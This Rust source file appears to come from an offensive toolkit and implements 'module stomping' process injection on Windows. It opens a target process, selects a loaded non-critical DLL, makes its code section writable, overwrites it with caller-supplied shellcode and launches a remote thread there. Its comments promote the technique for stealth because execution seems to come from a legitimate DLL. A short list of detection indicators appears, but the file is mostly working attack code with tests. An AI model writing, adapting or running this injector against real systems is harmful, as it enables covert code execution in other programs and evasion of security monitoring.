//! Tier 4: Module Stomping Injection
//!
//! Overwrites the .text section of a legitimate DLL already loaded in the target:
//! - Enumerate loaded modules in target process
//! - Find a suitable DLL with large enough .text section
//! - Change memory protection to RWX temporarily
//! - Write shellcode over the .text section
//! - Restore protection to RX
//! - Create thread at the stomped location
//!
//! This technique is stealthier because:
//! - No new memory allocations (uses existing module memory)
//! - Execution appears to come from a legitimate DLL
//! - Memory region is already marked as executable
//!
//! Detection: Memory scanning for modified .text sections,
//! module hash validation, Sysmon Event 7 (ImageLoad) anomalies

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
#[cfg(windows)]
use windows_sys::Win32::System::ProcessStatus::{
    EnumProcessModulesEx, GetModuleBaseNameW, GetModuleInformation, LIST_MODULES_ALL, MODULEINFO,
};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS,
};

/// Information about a loaded module
#[cfg(windows)]
#[derive(Debug)]
struct ModuleInfo {
    name: String,
    base_address: usize,
    size: usize,
}

/// Critical modules that should never be stomped
#[cfg(windows)]
const CRITICAL_MODULES: &[&str] = &[
    "ntdll.dll",
    "kernel32.dll",
    "kernelbase.dll",
    "user32.dll",
    "advapi32.dll",
    "msvcrt.dll",
    "combase.dll",
    "rpcrt4.dll",
    "sechost.dll",
    "bcrypt.dll",
    "bcryptprimitives.dll",
    "ucrtbase.dll",
];

/// Preferred modules for stomping (less likely to cause issues)
#[cfg(windows)]
const PREFERRED_MODULES: &[&str] = &[
    "version.dll",
    "cryptbase.dll",
    "sspicli.dll",
    "profapi.dll",
    "wldp.dll",
    "imagehlp.dll",
    "dbghelp.dll",
];

/// Check if a module is safe to stomp
#[cfg(windows)]
fn is_stompable(name: &str) -> bool {
    let lower = name.to_lowercase();

    // Never stomp critical modules
    for critical in CRITICAL_MODULES {
        if lower == *critical {
            return false;
        }
    }

    // Must be a DLL
    lower.ends_with(".dll")
}

/// Check if a module is preferred for stomping
#[cfg(windows)]
fn is_preferred(name: &str) -> bool {
    let lower = name.to_lowercase();
    PREFERRED_MODULES.iter().any(|&p| lower == p)
}

/// Enumerate modules loaded in a process
#[cfg(windows)]
fn enumerate_modules(proc_handle: isize) -> Result<Vec<ModuleInfo>, KrakenError> {
    let mut modules: [isize; 1024] = [0; 1024];
    let mut cb_needed: u32 = 0;

    let result = unsafe {
        EnumProcessModulesEx(
            proc_handle,
            modules.as_mut_ptr() as *mut _,
            std::mem::size_of_val(&modules) as u32,
            &mut cb_needed,
            LIST_MODULES_ALL,
        )
    };

    if result == 0 {
        return Err(KrakenError::Module("EnumProcessModulesEx failed".into()));
    }

    let module_count = cb_needed as usize / std::mem::size_of::<isize>();
    let mut module_infos = Vec::with_capacity(module_count);

    for i in 0..module_count {
        let module_handle = modules[i];
        if module_handle == 0 {
            continue;
        }

        // Get module name
        let mut name_buf: [u16; 260] = [0; 260];
        let name_len = unsafe {
            GetModuleBaseNameW(proc_handle, module_handle, name_buf.as_mut_ptr(), 260)
        };

        if name_len == 0 {
            continue;
        }

        let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);

        // Get module info (base address, size)
        let mut mod_info: MODULEINFO = unsafe { std::mem::zeroed() };
        let info_result = unsafe {
            GetModuleInformation(
                proc_handle,
                module_handle,
                &mut mod_info,
                std::mem::size_of::<MODULEINFO>() as u32,
            )
        };

        if info_result != 0 {
            module_infos.push(ModuleInfo {
                name,
                base_address: mod_info.lpBaseOfDll as usize,
                size: mod_info.SizeOfImage as usize,
            });
        }
    }

    Ok(module_infos)
}

/// Find best module to stomp based on shellcode size
#[cfg(windows)]
fn find_stomp_target(
    modules: &[ModuleInfo],
    shellcode_size: usize,
) -> Option<&ModuleInfo> {
    // First, try preferred modules
    for module in modules {
        if is_preferred(&module.name) && is_stompable(&module.name) {
            // Assume .text section is roughly 60% of module size
            let estimated_text_size = module.size * 6 / 10;
            if estimated_text_size >= shellcode_size {
                return Some(module);
            }
        }
    }

    // Fall back to any suitable module
    modules
        .iter()
        .filter(|m| is_stompable(&m.name))
        .filter(|m| {
            let estimated_text_size = m.size * 6 / 10;
            estimated_text_size >= shellcode_size
        })
        .next()
}

/// Inject using Module Stomping technique
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait for the injected thread to complete
/// * `timeout_ms` - Timeout in milliseconds (0 = infinite)
///
/// # Returns
/// * `Ok(InjectionResult)` on success
/// * `Err(KrakenError)` on failure
///
/// # Detection Indicators
/// - DLL .text section hash mismatch
/// - Memory protection changes on module regions
/// - Thread start address inside DLL but not at export
/// - Sysmon Event 10 with unusual CallTrace
#[cfg(windows)]
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    // Open target process
    let proc_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid) };
    let proc_handle = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("failed to open target process".into()))?;

    tracing::debug!(target_pid, "opened target process for module stomping");

    // Enumerate loaded modules
    let modules = enumerate_modules(proc_handle.as_raw())?;
    tracing::debug!(target_pid, module_count = modules.len(), "enumerated modules");

    // Find suitable module to stomp
    let target_module = find_stomp_target(&modules, shellcode.len())
        .ok_or_else(|| KrakenError::Module("no suitable module found for stomping".into()))?;

    tracing::debug!(
        target_pid,
        module_name = %target_module.name,
        module_base = format!("0x{:X}", target_module.base_address),
        module_size = target_module.size,
        "selected module for stomping"
    );

    // Calculate .text section address (typically starts after headers, ~0x1000 offset)
    // This is a simplification - in production, parse PE headers properly
    let text_offset = 0x1000usize;
    let stomp_address = target_module.base_address + text_offset;

    // Change protection to RWX temporarily
    let mut old_protect: u32 = 0;
    let protect_result = unsafe {
        VirtualProtectEx(
            proc_handle.as_raw(),
            stomp_address as *const _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };

    if protect_result == 0 {
        return Err(KrakenError::Module("VirtualProtectEx (RWX) failed".into()));
    }

    tracing::debug!(
        target_pid,
        addr = format!("0x{:X}", stomp_address),
        "changed protection to RWX"
    );

    // Write shellcode over .text section
    let mut bytes_written: usize = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            proc_handle.as_raw(),
            stomp_address as *mut _,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if write_result == 0 {
        // Restore protection before returning error
        unsafe {
            VirtualProtectEx(
                proc_handle.as_raw(),
                stomp_address as *const _,
                shellcode.len(),
                old_protect,
                &mut old_protect,
            );
        }
        return Err(KrakenError::Module("WriteProcessMemory failed".into()));
    }

    tracing::debug!(
        target_pid,
        bytes_written,
        module = %target_module.name,
        "wrote shellcode over .text section"
    );

    // Restore protection to RX (or original)
    let final_protect = if old_protect == PAGE_EXECUTE_READWRITE {
        PAGE_EXECUTE_READ
    } else {
        PAGE_EXECUTE_READ
    };

    unsafe {
        VirtualProtectEx(
            proc_handle.as_raw(),
            stomp_address as *const _,
            shellcode.len(),
            final_protect,
            &mut old_protect,
        );
    }

    tracing::debug!(target_pid, "restored memory protection to RX");

    // Create remote thread at stomped location
    let mut thread_id: u32 = 0;
    let thread_handle = unsafe {
        CreateRemoteThread(
            proc_handle.as_raw(),
            std::ptr::null(),
            0,
            Some(std::mem::transmute(stomp_address)),
            std::ptr::null(),
            0,
            &mut thread_id,
        )
    };

    let thread_handle = OwnedHandle::new(thread_handle);

    if thread_handle.is_none() {
        return Err(KrakenError::Module("CreateRemoteThread failed".into()));
    }

    tracing::info!(
        target_pid,
        thread_id,
        module = %target_module.name,
        "module stomping complete - thread created at stomped location"
    );

    // Wait for thread completion if requested
    if wait {
        let th = thread_handle.unwrap();
        let timeout = if timeout_ms == 0 { 0xFFFFFFFF } else { timeout_ms };
        let wait_result = unsafe { WaitForSingleObject(th.as_raw(), timeout) };
        if wait_result != WAIT_OBJECT_0 {
            tracing::warn!(target_pid, thread_id, "stomped thread wait timed out");
        }
    }

    Ok(InjectionResult {
        success: true,
        thread_id: Some(thread_id),
        technique_used: format!("Module Stomping ({})", target_module.name),
        error: None,
    })
}

#[cfg(not(windows))]
pub fn inject(
    _pid: u32,
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Module Stomping injection only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject(1234, &[0x90], false, 0);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(windows)]
    #[test]
    fn test_critical_modules_not_stompable() {
        assert!(!is_stompable("ntdll.dll"));
        assert!(!is_stompable("KERNEL32.DLL"));
        assert!(!is_stompable("kernelbase.dll"));
    }

    #[cfg(windows)]
    #[test]
    fn test_preferred_modules() {
        assert!(is_preferred("version.dll"));
        assert!(is_preferred("VERSION.DLL"));
        assert!(!is_preferred("ntdll.dll"));
    }

    #[cfg(windows)]
    #[test]
    fn test_stompable_modules() {
        assert!(is_stompable("version.dll"));
        assert!(is_stompable("someother.dll"));
        assert!(!is_stompable("kernel32.dll"));
        assert!(!is_stompable("notepad.exe")); // Not a DLL
    }
}
